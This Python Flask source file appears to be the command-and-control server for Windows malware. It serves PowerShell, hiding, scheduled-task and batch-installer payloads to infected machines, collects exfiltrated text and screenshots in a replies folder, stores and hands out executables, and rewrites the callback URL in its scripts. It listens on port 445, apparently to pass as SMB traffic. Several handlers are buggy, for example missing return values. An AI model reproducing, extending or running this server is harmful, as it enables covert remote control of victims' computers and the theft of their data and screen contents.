import os
from flask import Flask, request, send_file
from datetime import datetime
import re
app = Flask(__name__)

REPLIES_DIR = "replies"
if not os.path.exists(REPLIES_DIR):
    os.mkdir(REPLIES_DIR)
SCRIPTS_DIR = "scripts"
if not os.path.exists(SCRIPTS_DIR):
    os.mkdir(SCRIPTS_DIR)
EXE_DIR = "dist"
if not os.path.exists(EXE_DIR):
    os.mkdir(EXE_DIR)
SCRIPTS_FILE = os.path.join("resources", "scripts.txt")
HIDE_FILE = os.path.join("resources", "hide.txt")
PS_FILE = os.path.join("resources", "hide.txt")
SCH_FILE = os.path.join("resources", "sch.txt")
BAT_FILE = os.path.join("resources", "installer.bat")

if not os.path.exists(SCRIPTS_DIR):
    os.makedirs(SCRIPTS_DIR)


def sanitize_filename(filename):
    return re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
def modify_script_files(url):
    scripts = os.listdir(SCRIPTS_DIR)
    for script in scripts:
        with open(os.path.join(SCRIPTS_DIR, script), 'r') as file:
            data = file.read()
        data = data.replace("https://server.api", url)
        with open(os.path.join(SCRIPTS_DIR, script), 'w') as file:
            file.write(data)
def modify_installer(url):
    with open(BAT_FILE, 'r') as file:
        data = file.read()
    data = data.replace("https://server.api", url)
    with open(BAT_FILE, 'w') as file:
        file.write(data)

@app.route('/scripts.txt', methods=['GET'])
def get_scripts():
    if os.path.exists(SCRIPTS_FILE):
        return send_file(SCRIPTS_FILE, mimetype='text/plain')
    else:
        return "No scripts available", 404
@app.route('/pw.txt', methods=['GET'])
def return_powershell():
    return send_file(PS_FILE, mimetype='text/plain')
@app.route('/hide.txt', methods=['GET'])
def return_hide():
    return send_file(HIDE_FILE, mimetype='text/plain')
@app.route('/update', methods=['POST'])
def update_scripts():
    if request.method == 'POST':
        with open(SCRIPTS_FILE, 'w') as file:
            file.write("")
        return "Scripts updated to OK", 200
    else:
        return "Invalid request method", 405
@app.route('/scripts/<script_name>', methods=['GET'])
def get_script(script_name):
    script_path = os.path.join(SCRIPTS_DIR, script_name)
    if os.path.exists(script_path):
        return send_file(script_path, mimetype='application/octet-stream')
    else:
        return "Script not found", 404
@app.route('/reply', methods=['POST'])
def save_reply():
    text = request.json.get('INFO') 
    if not text or not text.strip():
        return "No text provided", 200 
    filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
    filepath = os.path.join(REPLIES_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(text)
    return f"Saved to {filename}", 200
@app.route('/ss', methods=['POST'])
def save_screenshot():
    if 'file' not in request.files:
        return 400
    file = request.files['file']
    if file.filename == '':
        return 400
    filename = f"{datetime.now()}-{sanitize_filename(file.filename)}"
    file_path = os.path.join(REPLIES_DIR, filename)
    file.save(file_path)
@app.route('/sch.txt', methods=['GET'])
def get_sch():
    return send_file(SCH_FILE, mimetype='text/plain')
@app.route('/file', methods=['GET'])
def replywith_file():
    file = os.listdir(EXE_DIR)[0]
    send_file(os.path.join(EXE_DIR, file), mimetype='text/plain')
@app.route('/savefile', methods=['POST'])
def save_file():
    if 'file' not in request.files:
        return 400
    file = request.files['file']
    if file.filename == '':
        return 400
    filename = file.filename
    file_path = os.path.join(EXE_DIR, filename)
    file.save(file_path)
    return f"Saved to {filename}", 200
@app.route('/bat', methods=['GET'])
def replywith_bat():
    return send_file(BAT_FILE, mimetype='text/plain')
@app.route('/modify', methods=['POST'])
def modify_scripts():
    data = request.data.decode()
    modify_script_files(data)
    modify_installer(data)
    return "OK", 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=445)
